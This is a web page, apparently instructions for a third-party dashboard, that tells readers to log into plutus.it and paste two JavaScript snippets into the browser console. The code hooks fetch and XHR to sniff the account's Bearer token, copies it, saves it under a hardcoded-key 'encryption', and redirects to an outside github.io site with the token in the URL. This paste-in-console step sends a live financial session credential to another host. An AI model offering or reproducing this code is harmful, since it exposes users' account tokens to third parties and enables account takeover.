How to Use This Dashboard

          
https://github.com/Davidbp99/plutusdashboard <- view code for the site

          
    
            
  1. Go to https://plutus.it and log in.
    2. 
            
  2. Open your browser's developer tools:
              
      
                
    • Windows/Linux: Ctrl + Shift + I or F12
      • 
                
    • Mac: Cmd + Option + I
      • 
              
    
            
    3. 
            
  3. Navigate to the Console tab.
    4. 
            
  4. Paste this code and hit Enter:
    5. 
          

          
(() => {
            const log = (msg, color, data = '') =>
              console.log(`%c${msg}`, `font-weight:bold;color:${color}`, data);
          
            const seen = new Set();
          
            const copyToken = (token, url) => {
              const clean = token.replace(/^Bearer\s+/i, '');
              if (seen.has(clean)) return;
              seen.add(clean);
              navigator.clipboard.writeText(clean)
                .then(() => {
                  log('üîê Bearer Token Detected and copied (clean):', 'limegreen', clean);
                  if (url) log('üîó From request to:', 'gray', url);
                  log('üìã Token copied ‚Äî ready to paste.', 'aqua');
                })
                .catch(err => console.warn('‚ùå Clipboard copy failed:', err));
            };
          
            const patchFetch = () => {
              const orig = window.fetch;
              window.fetch = async (...args) => {
                const [input, init = {}] = args;
                const url = typeof input === 'string' ? input : input?.url;
                const auth = init.headers?.Authorization || init.headers?.authorization;
                if (auth?.startsWith('Bearer ')) copyToken(auth, url);
                return orig(...args);
              };
            };
          
            const patchXHR = () => {
              const open = XMLHttpRequest.prototype.open;
              const setHeader = XMLHttpRequest.prototype.setRequestHeader;
          
              XMLHttpRequest.prototype.open = function (...args) {
                this._url = args[1];
                return open.apply(this, args);
              };
          
              XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
                if (k.toLowerCase() === 'authorization' && v.startsWith('Bearer '))
                  copyToken(v, this._url);
                return setHeader.apply(this, arguments);
              };
            };
          
            const init = () => {
              patchFetch();
              patchXHR();
              log('‚úÖ Sniffer active. Clean Bearer token will auto-copy.', 'orange');
            };
          
            document.readyState === 'complete'
              ? init()
              : window.addEventListener('load', init);
          })();

(async function() {
            const loadScript = (src) => new Promise((resolve, reject) => {
              const s = document.createElement('script');
              s.src = src;
              s.onload = resolve;
              s.onerror = reject;
              document.head.appendChild(s);
            });
          
            if (typeof CryptoJS === 'undefined') {
              await loadScript('https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js');
            }
          
            const log = (msg, color, data = '') =>
              console.log(`%c${msg}`, `font-weight:bold;color:${color}`, data);
          
            const ENCRYPTION_KEY = 'plutus-salt';
            const TOKEN_KEY = 'plutusAuthTokenEnc';
            const seen = new Set();
          
            const saveToken = (token) => {
              try {
                const encrypted = CryptoJS.AES.encrypt(token, ENCRYPTION_KEY).toString();
                localStorage.setItem(TOKEN_KEY, encrypted);
                log('üíæ Token saved to localStorage (encrypted).', 'dodgerblue');
              } catch (e) {
                console.warn('‚ùå Failed to save token:', e);
              }
            };
          
            const copyToken = (token, url) => {
              const clean = token.replace(/^Bearer\s+/i, '');
              if (seen.has(clean)) return;
              seen.add(clean);
              navigator.clipboard.writeText(clean).catch(() => {});
              saveToken(clean);
          
              
              window.location.href = `https://davidbp99.github.io/plutusdashboard/?token=${encodeURIComponent(clean)}`;
            };
          
            const patchFetch = () => {
              const orig = window.fetch;
              window.fetch = async (...args) => {
                const [input, init = {}] = args;
                const url = typeof input === 'string' ? input : input?.url;
                const auth = init.headers?.Authorization || init.headers?.authorization;
                if (auth?.startsWith('Bearer ')) copyToken(auth, url);
                return orig(...args);
              };
            };
          
            const patchXHR = () => {
              const open = XMLHttpRequest.prototype.open;
              const setHeader = XMLHttpRequest.prototype.setRequestHeader;
          
              XMLHttpRequest.prototype.open = function (...args) {
                this._url = args[1];
                return open.apply(this, args);
              };
          
              XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
                if (k.toLowerCase() === 'authorization' && v.startsWith('Bearer '))
                  copyToken(v, this._url);
                return setHeader.apply(this, arguments);
              };
            };
          
            patchFetch();
            patchXHR();
            log('‚úÖ Token sniffer running. Will auto-save detected tokens and redirect.', 'orange');
          })();
